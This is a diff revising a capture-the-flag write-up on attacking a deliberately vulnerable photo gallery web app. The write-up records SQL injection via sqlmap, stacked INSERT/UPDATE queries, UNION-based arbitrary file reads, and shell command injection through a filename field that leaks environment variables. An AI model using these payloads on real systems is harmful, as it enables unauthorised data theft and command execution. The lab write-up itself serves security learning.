@@ -29,7 +29,7 @@ Navigating directly to ```fetch?id=3``` yields a 500 error:
 > Internal Server Error
 > The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.
 
-However, navigating to further ids e.g. ```fetch?id=4```, ```fetch?id=5```, ```fetch?id=100```, ```fetch?id=0```, ```fetch?id=-1``` yields 404s:
+However, navigating to further ids beyond 1,2,3 e.g. ```fetch?id=4```, ```fetch?id=5```, ```fetch?id=100```, ```fetch?id=0```, ```fetch?id=-1``` yields 404s:
 
 > Not Found
 > The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
@@ -38,9 +38,9 @@ This is interesting and likely indicates the file at ```id=3``` does exist, but 
 
 Testing this query further, using letters e.g. ```fetch?id=a```, ```fetch?id=zzz``` yields 500s.
 
-This indicates ```fetch?id=``` may use a vulnerable SQL query and parameter ```id``` is of type ```INT```.
+This indicates ```fetch?id=``` may use a SQL query and parameter ```id``` is of type ```INT```.
 
-Testing SQL comments injections ```fetch?id=1--%20comment``` and ```fetch?id=1#comment``` does not cause any errors and returns the same output. Likewise, trying AND injections e.g. ```fetch?id=1 AND 1=1``` returns the same output, and ```fetch?id=1 AND 1=2``` yields a 404. This confirms that ```fetch?id=``` uses a SQL query and is MySQL (only MySQL accepts # comments). This comment injection succeeding also indicates that the id parameter is either at the end of the SQL query or what is after the comment is inconsequential which may or may not be important.
+Testing SQL comments injections ```fetch?id=1--%20comment``` and ```fetch?id=1#comment``` does not cause any errors and returns the same output. Likewise, trying AND injections e.g. ```fetch?id=1 AND 1=1``` returns the same output, and ```fetch?id=1 AND 1=2``` yields a 404. This confirms that ```fetch?id=``` uses a SQL query and is MySQL (only MySQL accepts # comments). This comment injection succeeding also indicates that the id parameter is either at the end of the SQL query or what is after the comment is inconsequential, which may or may not be important.
 
 Running ```sqlmap``` on ```fetch?id=1``` with option ```--dbs``` finds:
 
@@ -62,7 +62,7 @@ available databases [4]:
 [*] performance_schema
 ```
 
-The DBMS is MySQL and a blind time-based injection vulnerability is found, which is leveraged to find the databases. All databases except ```level5``` look standard. So looking further, running ```sqlmap``` with options ```-D level5``` and ```--dump``` finds:
+The DBMS is MySQL and a blind time-based injection vulnerability is found in the ```id=``` parameter, which is leveraged to find the databases. All databases except ```level5``` look standard. So looking further, running ```sqlmap``` with options ```-D level5``` and ```--dump``` finds:
 
 ```
 Database: level5
@@ -100,9 +100,9 @@ SELECT filename FROM photos WHERE id=[]
 
 This is significant as it is shows the potential of stacked SQL queries i.e. it may be possible to make a query like ```SELECT filename FROM photos WHERE id=%d; INSERT into photos(...) values(...) #```
 
-Testing ```fetch?id=1;INSERT into photos(id, title, parent, filename) values(4, 'hello world', 1, 'files/adorable.jpg') #``` and navigating to ```fetch?id=4``` didn't work; 404 is still returned . However, adding the ```COMMIT``` command to the end i.e. ```fetch?id=1;INSERT (...); COMMIT #``` succeeds. Navigating to ```fetch?id=4``` now returns the .jpg text where a 404 was previously returned, proving the existence of a stacked query injection vulnerability.
+Testing ```fetch?id=1;INSERT into photos(id,title,parent,filename) values(4,'hello world',1,'files/adorable.jpg')``` and navigating to ```fetch?id=4``` didn't work; 404 is still returned . However, adding the ```COMMIT``` command to the end i.e. ```fetch?id=1;INSERT (...); COMMIT #``` succeeds. Navigating to ```fetch?id=4``` now returns the .jpg text where a 404 was previously returned, proving the existence of a stacked query injection vulnerability.
 
-Trying ```fetch?id=1;UPDATE photos set title='<script>alert(1)</script>' WHERE id=1; COMMIT #``` and ```fetch?id=1;UPDATE albums set title='<script>alert(2)</script>' WHERE id=1; COMMIT #``` defaced the website, but did not succeed in XSS as the photo title is inserted as a HTML text node, and album title is encased in a ```<h2>``` element:
+Trying ```fetch?id=1;UPDATE photos set title='<script>alert(1)</script>' WHERE id=1; COMMIT``` and ```fetch?id=1;UPDATE albums set title='<script>alert(2)</script>' WHERE id=1; COMMIT #``` defaced the website, but did not succeed in XSS as the photo title is inserted as a HTML text node, and album title is encased in a ```<h2>``` element:
 
 ![Homepage](imgs/2_gallery.jpg "Homepage")
 
@@ -135,17 +135,15 @@ Trying ```fetch?id=1 UNION SELECT 'Dockerfile'``` didn't work. It's likely the c
 
 Only ```files/adorable``` used, but ```Dockerfile``` is the one desired.
 
-So, the query should be forced to return only the result of the ```UNION``` injection by making the ```WHERE id=``` portion of the query return nothing i.e. ```Dockerfile``` should be the only row returned and thus fed into the file open function. It is known that rows where ```id``` is greater than ```4``` do not exist. Leveraging this, ```fetch?id=9 UNION SELECT 'Dockerfile'``` will return the single row containing ```Dockerfile``` since no rows exist where id=9. This succeeds in exposing the Dockerfile:
+So, the query can be reordered to put the injected filename at the top via the ```ORDER BY filename (DESC|ASC)``` clause i.e. ```fetch?id=1 UNION SELECT 'Dockerfile' FROM photos ORDER BY filename ASC```
 
-```
-FROM tiangolo/uwsgi-nginx-flask:python2.7 WORKDIR /app RUN apt-get update RUN DEBIAN_FRONTEND=noninteractive apt-get install -y mysql-client mysql-server default-libmysqlclient-dev build-essential ADD requirements.txt /app/ RUN pip install --trusted-host pypi.python.org -r requirements.txt ADD . /app
-```
+> FROM tiangolo/uwsgi-nginx-flask:python2.7 WORKDIR /app RUN apt-get update RUN DEBIAN_FRONTEND=noninteractive apt-get install -y mysql-client mysql-server default-libmysqlclient-dev build-essential ADD requirements.txt /app/ RUN pip install --trusted-host pypi.python.org -r requirements.txt ADD . /app
 
-Open ```requirements.txt``` via ```fetch?id=9 UNION SELECT 'requirements.txt'``` shows:
+Another option is to force the query to return only the result of the ```UNION``` injection by making the ```WHERE id=``` portion of the query return nothing i.e. ```Dockerfile``` should be the only row returned and thus fed into the file open function. It is known that rows where ```id``` is greater than ```4``` do not exist. Leveraging this, ```fetch?id=9 UNION SELECT 'Dockerfile'``` will return the single row containing ```Dockerfile``` since no rows exist where id=9. This also succeeds in exposing the Dockerfile.
 
-```
-Flask mysqlclient pycrypto
-```
+Open ```requirements.txt``` as seen in the Dockerfile via ```fetch?id=9 UNION SELECT 'requirements.txt'``` shows:
+
+> Flask mysqlclient pycrypto
 
 Nothing special, but confirms that any file any be read with this query.
 
@@ -217,7 +215,7 @@ if __name__ == "__main__":
 
 ## FLAG2
 
-Looking through ```main.py```, some non-parameterzied SQL queries are evident, which have already been exploited to reach this point. However, very significantly a system call is made with no input sanitation or validation in the ```Space used:``` portion of the webapp:
+Looking through ```main.py```, some vulnerable non-parameterzied SQL queries are evident, which have already been exploited to reach this point. However, very significantly a system call is made with no input sanitation or validation in the ```Space used:``` portion of the webapp:
 
 ```
 rep += '<i>Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '</i>'
@@ -243,8 +241,9 @@ Calling ```cat``` on suspicious targets including ```/etc/passwd``` and ```/etc/
 
 So, try the read the environment variables via ```env``` i.e. ```fetch?id=1;UPDATE photos set filename='env | tr "\n" " "' WHERE id=3; COMMIT #``` which returns:
 
-> Space used: PYTHONIOENCODING=UTF-8 UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgi SUPERVISOR_GROUP_NAME=uwsgi FLAGS=["FLAG0", "FLAG1", "FLAG2"] HOSTNAME=2fe9e014dc2c SHLVL=0 PYTHON_PIP_VERSION=18.1 HOME=/root GPG_KEY=C01E1CAD5EA2C4F0B8E3571504C367C218ADD4FF UWSGI_INI=/app/uwsgi.ini NGINX_MAX_UPLOAD=0 UWSGI_PROCESSES=16 STATIC_URL=/static UWSGI_CHEAPER=2 NGINX_VERSION=1.13.12-1~stretch PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin NJS_VERSION=1.13.12.0.2.0-1~stretch LANG=C.UTF-8 SUPERVISOR_ENABLED=1 PYTHON_VERSION=2.7.15 NGINX_WORKER_PROCESSES=1 SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock SUPERVISOR_PROCESS_NAME=uwsgi LISTEN_PORT=80 STATIC_INDEX=0 PWD=/app STATIC_PATH=/app/static PYTHONPATH=/app UWSGI_RELOADS=0
+> Space used: PYTHONIOENCODING=UTF-8 UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgi SUPERVISOR_GROUP_NAME=uwsgi **FLAGS=["FLAG0", "FLAG1", "FLAG2"]** HOSTNAME=2fe9e014dc2c SHLVL=0 PYTHON_PIP_VERSION=18.1 HOME=/root GPG_KEY=C01E1CAD5EA2C4F0B8E3571504C367C218ADD4FF UWSGI_INI=/app/uwsgi.ini NGINX_MAX_UPLOAD=0 UWSGI_PROCESSES=16 STATIC_URL=/static UWSGI_CHEAPER=2 NGINX_VERSION=1.13.12-1\~stretch PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin NJS_VERSION=1.13.12.0.2.0-1\~stretch LANG=C.UTF-8 SUPERVISOR_ENABLED=1 PYTHON_VERSION=2.7.15 NGINX_WORKER_PROCESSES=1 SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock SUPERVISOR_PROCESS_NAME=uwsgi LISTEN_PORT=80 STATIC_INDEX=0 PWD=/app STATIC_PATH=/app/static PYTHONPATH=/app UWSGI_RELOADS=0
 
 #### FLAG2 is captured.
 
-### All flags captured
+All flags captured
+=====
